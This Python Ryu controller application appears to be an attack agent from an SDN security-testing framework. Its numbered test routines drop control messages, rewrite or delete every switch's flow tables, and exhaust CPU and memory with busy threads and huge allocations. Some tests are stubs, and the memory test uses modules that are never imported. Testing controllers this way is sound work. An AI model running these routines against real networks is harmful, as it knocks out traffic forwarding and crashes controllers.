from threading import Thread
from ryu.base import app_manager
from am_interface import AMInterface
from ryu.controller import ofp_event
from ryu.controller.handler import CONFIG_DISPATCHER, MAIN_DISPATCHER
from ryu.controller.handler import set_ev_cls
from ryu.lib.packet import packet
from ryu.lib.packet import ethernet
from ryu.controller import dpset
from ryu.ofproto import ofproto_v1_0

class AppAgent(app_manager.RyuApp):
    OFP_VERSIONS = [ofproto_v1_0.OFP_VERSION]
    _CONTEXTS = {
        'dpset': dpset.DPSet
    }

    def __init__(self, *args, **kwargs):
        super(AppAgent, self).__init__(*args, **kwargs)
        self.dpset = kwargs['dpset']
        self.drop = 0
        self.modify = 0
        self.clear = 0
        self.msg = None

        # Run AMInterface Thread
        ami = AMInterface(self, self.logger)
        server_address = ami.setServerAddr()
        t = Thread(target=ami.connectServer, args=(server_address,))
        t.start()
        self.logger.info("[App-Agent] Starting AppAgent on Ryu")

    # 3.1.020
    def testControlMessageDrop(self):
        self.logger.info("[ATTACK] Start Control Message Drop")
        self.drop = 1

    # 3.1.020 drop
    # TODO: any good idea to drop the packet-in?
    def callControlMessageDrop(self):
        pkt = packet.Packet(self.msg.data)
        eth = pkt.get_protocols(ethernet.ethernet)[0]
        self.logger.info("Drop Packet Info: ")
        self.logger.info(str(eth) + "\n")

    # 3.1.030
    def testInfiniteLoops(self):
        self.logger.info("[ATTACK] Start Infinite Loop")
        self.callInfiniteLoops()

    # Start Loop
    def callInfiniteLoops(self):
        i = 0

        while i < 32767:
            i = i + 1

            if i == 32766:
                i = 0

    # 3.1.040
    # TODO:
    def testInternalStorageAbuse(self):
        self.logger.info("testInternalStorageAbuse")

    # 3.1.070
    def testFlowRuleModification(self):
        self.logger.info("[ATTACK] Start Flow Rule Modification")

        for dp in self.dpset.dps.values():
            match = dp.ofproto_parser.OFPMatch()
            actions = []
            flow_mod = dp.ofproto_parser.OFPFlowMod(datapath=dp, match=match, cookie=0,
                                                    actions=actions,
                                                    command=dp.ofproto.OFPFC_MODIFY)
            dp.send_msg(flow_mod)
            self.logger.info("[App-Agent] Sending a OF FlowMod message '%s' to switch '%s'" % (str(flow_mod), str(dp.id)))

        result = "success|" + str(flow_mod)
        return result

    # 3.1.080
    def testFlowTableClearance(self):
        self.logger.info("[ATTACK] Start Flow Table Clearance")
        self.clear = 1

    def callFlowTableClearance(self):
        for dp in self.dpset.dps.values():
            match = dp.ofproto_parser.OFPMatch()
            flow_mod = dp.ofproto_parser.OFPFlowMod(datapath=dp, match=match, cookie=0,
                                                    command=dp.ofproto.OFPFC_DELETE)
            dp.send_msg(flow_mod)

    # 3.1.090
    # TODO:
    def testEventListenerUnsubscription(self):
        self.logger.info("testEventListenerUnsubscription")

    # 3.1.110
    def testMemoryExhaustion(self):
        self.logger.info("[ATTACK] Memory Exhaustion")
        array.array('B', itertools.repeat(0, sys.maxint))

    # 3.1.120
    def testCPUExhaustion(self):
        self.logger.info("[ATTACK] CPU Exhaustion")
        for i in range(0, 10000):
            t = Thread(target=self.CPUThread)
            t.start()

    # dummy thread
    def CPUThread(self):
        x = 0
        while True:
            x = x + 1

    @set_ev_cls(ofp_event.EventOFPPacketIn , MAIN_DISPATCHER)
    def packetIn_handler(self, ev):
        self.msg = ev.msg

        if self.drop:
            self.callControlMessageDrop()
        if self.clear:
            self.callFlowTableClearance()

if __name__ == "__main__":
    a = AppAgent()
